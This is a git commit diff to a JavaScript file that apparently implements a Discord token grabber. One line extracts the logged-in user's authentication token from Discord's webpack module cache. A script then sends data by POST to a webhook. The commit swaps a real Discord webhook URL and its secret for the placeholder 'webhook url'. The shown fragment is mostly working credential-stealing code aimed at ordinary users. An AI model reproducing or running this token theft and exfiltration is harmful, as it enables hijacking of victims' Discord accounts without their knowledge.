f64701f0657899b26bdb31cd30c1c70e87ba8e45
Patrick <83720283+patrickzhou1234@users.noreply.github.com>
2022-11-25 15:04:43 -0800

    Update updated.js

--- updated.js
+++ updated.js
@@ -1,7 +1,7 @@
 const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
 
     const script = `
-        fetch("https://discord.com/api/webhooks/1005256404459864134/gTsS-DLcTddkwmsy1wGi_hcvdhA6CkiLLW_QFft3N0xDyaw7V1315OXIXlT3CHNWgzec", {
+        fetch("webhook url", {
             "method": "POST",
             "headers": {
                 "Content-Type": "application/json"
